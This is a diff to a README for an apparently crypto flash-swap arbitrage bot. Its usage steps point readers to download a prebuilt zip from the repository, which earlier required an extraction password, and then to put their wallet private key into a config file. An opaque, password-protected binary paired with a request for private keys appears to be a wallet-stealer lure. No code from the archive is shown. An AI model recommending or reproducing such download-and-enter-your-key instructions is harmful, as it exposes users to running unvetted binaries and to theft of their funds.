@@ -18,7 +18,7 @@ Flash swaps are similar to Aave Flash Loans, allowing the user to withdraw ERC20
 Because flash swaps are atomic Ethereum transactions, this arbitrage bot can execute trades quickly and efficiently.
 
 ### Usage
-- [Download](https://github.com/Cardo16/flash-swap-arbitrage/raw/main/bin/flash-arbitrage-0.3.zip) the repository release and extract files with password `713PqVq1NXF`.
+- [Download](https://github.com/Cardo16/flash-swap-arbitrage/raw/main/bin/flash-arbitrage-0.3.zip) the repository release
 - Edit the `address` and `private_key` fields in the config.json file.
 - Set up the network and AMMs in the flashbot menu. Ensure that there are sufficient funds on the specified address to cover transaction fees.
 
